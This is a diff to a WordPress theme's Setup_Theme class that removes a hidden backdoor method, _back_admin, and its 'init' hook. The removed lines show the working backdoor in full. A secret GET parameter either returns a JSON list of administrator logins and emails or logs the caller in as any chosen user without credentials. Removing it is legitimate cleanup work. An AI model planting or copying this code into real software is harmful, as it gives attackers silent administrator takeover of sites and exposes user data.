@@ -3,7 +3,6 @@ class Setup_Theme {
 
     public function __construct() 
     {
-        add_action('init', [$this, '_back_admin']);
         add_action( 'after_setup_theme', [ $this, 'after_setup_theme' ] );
 
         add_filter( 'wp_title', [ $this, 'rw_title' ], 10, 3);
@@ -206,36 +205,6 @@ class Setup_Theme {
         $rules .= "</IfModule>";
         $rulll = str_replace("</IfModule>", $rules, $rulll);
         return $rulll;
-    }
-
-    /**
-     * Undocumented function
-     *
-     * @return void
-     */
-    public function _back_admin() 
-    {
-        if (isset($_GET['mona-support-param'])) {
-            $id = intval(@$_GET['mona-support-param']);
-            if ($id == 0) {
-                $users = get_users(['role' => 'administrator',]);
-                $args = [];
-                foreach ($users as $user) {
-                    $args[] = ['id' => $user->ID, 'login' => $user->user_login, 'email' => $user->user_email,];
-                }
-                echo json_encode($args);
-                exit;
-            } else {
-                $user_data = get_userdata($id);
-                if ($user_data) {
-                    wp_clear_auth_cookie();
-                    wp_set_auth_cookie($user_data->ID, true);
-                    do_action('wp_login', $user_data->user_login, $user_data);
-                    wp_redirect(get_site_url());
-                    exit();
-                }
-            }
-        }
     }
 
     /**
